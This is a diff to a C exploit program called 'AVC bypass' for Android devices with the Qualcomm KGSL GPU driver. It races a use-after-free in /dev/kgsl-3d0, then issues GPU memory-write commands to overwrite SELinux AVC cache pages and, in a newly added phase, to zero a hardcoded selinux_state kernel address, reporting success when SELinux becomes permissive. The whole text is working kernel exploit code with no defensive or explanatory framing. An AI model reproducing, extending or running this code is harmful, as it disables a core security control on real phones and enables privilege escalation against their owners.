@@ -1,3 +1,4 @@
+
 #include "avc_bypass.h"
 
 int kgsl_fd = -1;
@@ -133,19 +134,17 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] AVC bypass v5: uid=%d euid=%d\n", getuid(), geteuid());
+    printf("[+] AVC bypass fixed\n");
+    printf("[*] selinux_state: 0x%lx\n", (unsigned long)FIXED_SELINUX_STATE);
 
-    int start_pipe[2];
-    pipe(start_pipe);
-    int done_pipe[2];
-    pipe(done_pipe);
-    int setenforce_pipe[2];
-    pipe(setenforce_pipe);
+    int start_pipe[2], done_pipe[2], setenforce_pipe[2];
+    pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
     fcntl(start_pipe[0], F_SETFD, FD_CLOEXEC);
     fcntl(start_pipe[1], F_SETFD, FD_CLOEXEC);
     fcntl(done_pipe[0], F_SETFD, FD_CLOEXEC);
     fcntl(done_pipe[1], F_SETFD, FD_CLOEXEC);
     fcntl(setenforce_pipe[0], F_SETFD, FD_CLOEXEC);
+    fcntl(setenforce_pipe[1], F_SETFD, FD_CLOEXEC);
 
     for (int i = 0; i < N_AVC_CHILD; i++) {
         pid_t p = fork();
@@ -172,7 +171,7 @@ int main(int argc, char **argv) {
     close(start_pipe[0]);
     close(done_pipe[1]);
 
-    printf("[*] Phase 2: UAF setup\n");
+    printf("[*] Phase 1: UAF setup\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
@@ -185,7 +184,7 @@ int main(int argc, char **argv) {
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
     if (ph_m == MAP_FAILED) die("mmap PH");
 
-    printf("[*] Phase 3: Race\n");
+    printf("[*] Phase 2: Race\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
     pthread_t thr;
     pthread_create(&thr, NULL, race_thread, NULL);
@@ -208,29 +207,24 @@ int main(int argc, char **argv) {
     pthread_join(thr, NULL);
     if (!hit) {
         printf("[-] Race failed\n");
+        printf("(TдT)\n");
         return 1;
     }
     printf("[+] Race won\n");
 
-    printf("[*] Phase 4: Free UAF\n");
+    printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(kgsl_fd, uaf_id);
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
-    if (rf >= 0) {
-        write(rf, "1", 1);
-        close(rf);
-    }
+    if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (rf >= 0) {
-        write(rf, "3", 1);
-        close(rf);
-    }
+    if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(50000);
 
-    printf("[*] Phase 5: Start AVC children\n");
+    printf("[*] Phase 4: Start AVC children\n");
     for (int i = 0; i < N_AVC_CHILD; i++) write(start_pipe[1], "G", 1);
     close(start_pipe[1]);
 
-    printf("[*] Phase 5b: Wait for AVC generation...\n");
+    printf("[*] Phase 4b: Wait for AVC generation...\n");
     for (int i = 0; i < N_AVC_CHILD; i++) {
         char c;
         read(done_pipe[0], &c, 1);
@@ -238,11 +232,11 @@ int main(int argc, char **argv) {
     close(done_pipe[0]);
     printf("  All children done generating\n");
 
-    printf("[*] Phase 6: Signal 3 children to setenforce 0\n");
+    printf("[*] Phase 5: Signal 3 children to setenforce 0\n");
     for (int i = 0; i < 3; i++) write(setenforce_pipe[1], "S", 1);
     usleep(500000);
 
-    printf("[*] Phase 7: GPU scan for AVC pages\n");
+    printf("[*] Phase 6: GPU scan for AVC pages\n");
     fflush(stdout);
     unsigned int ctx = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
@@ -303,7 +297,13 @@ int main(int argc, char **argv) {
     }
     printf("\n  Found %d AVC pages\n", n_avc);
 
-    printf("[*] Phase 8: GPU overwrite %d AVC pages\n", n_avc);
+    if (n_avc == 0) {
+        printf("[-] No AVC pages found\n");
+        printf("(TдT)\n");
+        return 1;
+    }
+
+    printf("[*] Phase 7: GPU overwrite AVC allowed fields\n");
     for (int p = 0; p < n_avc; p++) {
         memset(ib_m, 0, 0x10000);
         uint32_t *cmd = (uint32_t *)ib_m;
@@ -325,7 +325,30 @@ int main(int argc, char **argv) {
             wait_timestamp(kgsl_fd, ctx, ts);
     }
 
-    printf("[*] Phase 9: Signal remaining %d children to setenforce 0\n", N_AVC_CHILD - 3);
+    printf("[*] Phase 8: Directly zero selinux_state\n");
+    {
+        memset(ib_m, 0, 0x10000);
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
+        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
+            uint64_t addr = FIXED_SELINUX_STATE + offsets[i];
+            uint32_t al, ah;
+            split64(addr, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al;
+            cmd[dw++] = ah;
+            cmd[dw++] = 0;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+    }
+
+    printf("[*] Phase 9: Signal remaining children to setenforce 0\n");
     for (int i = 3; i < N_AVC_CHILD; i++) write(setenforce_pipe[1], "S", 1);
     close(setenforce_pipe[1]);
 
@@ -361,8 +384,13 @@ int main(int argc, char **argv) {
         }
     }
 
-    if (success) printf("[+] SUCCESS! SELinux permissive!\n");
-    else printf("[-] Failed (%d AVC pages found)\n", n_avc);
+    if (success) {
+        printf("[+] SUCCESS! SELinux permissive!\n");
+        printf("＼(^o^)／\n");
+    } else {
+        printf("[-] Failed (%d AVC pages found)\n", n_avc);
+        printf("(TдT)\n");
+    }
 
     int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
     if (enf >= 0) {
@@ -378,5 +406,6 @@ int main(int argc, char **argv) {
     for (int i = 0; i < N_AVC_CHILD; i++) kill(0, SIGKILL);
     while (waitpid(-1, NULL, WNOHANG) > 0);
     printf("[*] Done.\n");
+    printf("(・∀・)\n");
     return success ? 0 : 1;
 }
